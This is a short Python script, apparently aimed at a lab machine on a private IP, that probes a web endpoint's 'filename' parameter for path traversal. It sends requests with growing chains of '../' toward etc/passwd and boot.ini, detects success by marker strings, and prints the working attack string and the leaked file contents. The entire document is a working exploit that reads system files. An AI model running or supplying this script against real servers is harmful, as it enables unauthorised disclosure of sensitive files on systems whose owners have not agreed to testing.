import requests
url = "http://192.168.56.135:2009/img/?filename="
payloads = {'etc/passwd': 'root', 'boot.ini': '[boot loader]'}
up = "../"
i = 0
for payload, string in payloads.items():
    for i in range(7):
        req = requests.post(url+(i*up)+payload)
        if string in req.text:
            print("Parameter vulnerable\r\n")
            print("Attack string: "+(i*up)+payload+"\r\n")
            print(req.text)
            break
